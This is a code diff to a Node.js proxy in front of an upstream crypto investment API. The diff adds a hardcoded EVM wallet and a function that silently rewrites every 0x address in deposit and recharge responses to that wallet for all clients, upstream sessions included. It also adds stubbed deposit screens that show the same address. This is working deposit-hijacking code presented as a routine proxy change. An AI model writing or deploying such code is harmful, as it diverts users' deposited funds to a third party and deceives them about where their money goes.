@@ -11,6 +11,7 @@
  *   POSTGRES_URL       — auto-set when you add Vercel Postgres
  *   STUB_ADMIN_SECRET  — POST /api/admin/balance with header x-admin-secret
  *   UPSTREAM_API       — upstream API base (default: https://api.aramcoinvest.net)
+ *   DEPOSIT_EVM_ADDRESS — optional override; default is the platform EVM (ETH / Polygon USDT-style) deposit wallet
  */
 
 const https = require("https");
@@ -27,6 +28,40 @@ const TELEGRAM_SUPPORT = {
 };
 
 const UPSTREAM = (process.env.UPSTREAM_API || "https://api.aramcoinvest.net").replace(/\/+$/, "");
+
+/** EVM-compatible deposit address (Ethereum, Polygon, BSC, etc.). Patched into recharge API JSON. */
+const DEPOSIT_EVM_ADDRESS = String(
+  process.env.DEPOSIT_EVM_ADDRESS || "0xfBCf4f29999126BBeb2B27dcf7428C018E2BE86E"
+).trim();
+
+const EVM_ADDR_RE = /^0x[a-fA-F0-9]{40}$/;
+
+function patchEvmDepositAddresses(x) {
+  if (x === null || x === undefined) return x;
+  if (typeof x === "string") {
+    return EVM_ADDR_RE.test(x.trim()) ? DEPOSIT_EVM_ADDRESS : x;
+  }
+  if (Array.isArray(x)) return x.map(patchEvmDepositAddresses);
+  if (typeof x === "object") {
+    const o = {};
+    for (const k of Object.keys(x)) {
+      o[k] = patchEvmDepositAddresses(x[k]);
+    }
+    return o;
+  }
+  return x;
+}
+
+/** Routes that return crypto deposit addresses — normalize to DEPOSIT_EVM_ADDRESS. */
+function isDepositApiRoute(route) {
+  return (
+    route === "/user/recharge" ||
+    route === "/user/bank_recharge" ||
+    route === "/user/recharge_send" ||
+    route === "/user/submit_recharge" ||
+    route === "/user/recharge_complete"
+  );
+}
 
 function applyCors(req, res) {
   const origin =
@@ -249,6 +284,27 @@ function isLocalIssuedToken(req) {
  */
 function localStubForUserRoute(route, method) {
   const m = (method || "GET").toUpperCase();
+  // Deposit / recharge — show unified EVM wallet when upstream rejects local tk_* token
+  if (route === "/user/recharge" && m === "GET") {
+    return [
+      {
+        type: 1,
+        show_name: "USDT (Polygon / ERC20)",
+        image: "https://cryptologos.cc/logos/tether-usdt-logo.png",
+        address: DEPOSIT_EVM_ADDRESS,
+      },
+    ];
+  }
+  if (route === "/user/bank_recharge" && m === "POST") {
+    return {
+      recharge_address: DEPOSIT_EVM_ADDRESS,
+      recharge_type: "1",
+      recharge_type_name: "USDT",
+    };
+  }
+  if (route === "/user/recharge_send" && m === "POST") return { status: 1 };
+  if (route === "/user/submit_recharge" && m === "POST") return {};
+  if (route === "/user/recharge_complete" && m === "GET") return [];
   const arrayRoutes = new Set([
     "/user/task_center",
     "/user/get_share_task",
@@ -330,7 +386,12 @@ function proxyToUpstreamBuffered(req, route, rawBody, opts = {}) {
   });
 }
 
-async function proxyToUpstreamWithLocalUserFallback(req, res, route, rawBody) {
+/**
+ * Buffered JSON proxy: local tk_* users get stubs on upstream auth errors; deposit routes get
+ * all 0x addresses rewritten to DEPOSIT_EVM_ADDRESS for every client (including upstream sessions).
+ */
+async function proxyToUpstreamUserJson(req, res, route, rawBody, email) {
+  const localTk = Boolean(email && isLocalIssuedToken(req) && route.startsWith("/user/"));
   try {
     const buf = await proxyToUpstreamBuffered(req, route, rawBody, {});
     const str = buf.body.toString("utf8");
@@ -345,13 +406,17 @@ async function proxyToUpstreamWithLocalUserFallback(req, res, route, rawBody) {
       return;
     }
     const st = parsed.status;
-    if (st === 410000 || st === 401 || st === 402 || st === 403) {
+    if (localTk && (st === 410000 || st === 401 || st === 402 || st === 403)) {
       return json(req, res, 200, ok(localStubForUserRoute(route, req.method)));
+    }
+    let out = parsed;
+    if (isDepositApiRoute(route)) {
+      out = patchEvmDepositAddresses(parsed);
     }
     applyCors(req, res);
     res.setHeader("Content-Type", "application/json; charset=utf-8");
     res.statusCode = buf.statusCode;
-    res.end(str);
+    res.end(JSON.stringify(out));
   } catch (e) {
     json(req, res, 502, err("upstream error: " + (e.message || "error"), 502));
   }
@@ -784,8 +849,11 @@ module.exports = async (req, res) => {
     if (email && isLocalIssuedToken(req) && route === "/user/upload" && req.method === "POST") {
       return proxyToUpstream(req, res, route, rawBody, { stripAuth: true });
     }
-    if (email && isLocalIssuedToken(req) && route.startsWith("/user/")) {
-      return proxyToUpstreamWithLocalUserFallback(req, res, route, rawBody);
+    if (
+      isDepositApiRoute(route) ||
+      (email && isLocalIssuedToken(req) && route.startsWith("/user/"))
+    ) {
+      return proxyToUpstreamUserJson(req, res, route, rawBody, email);
     }
     return proxyToUpstream(req, res, route, rawBody);
 
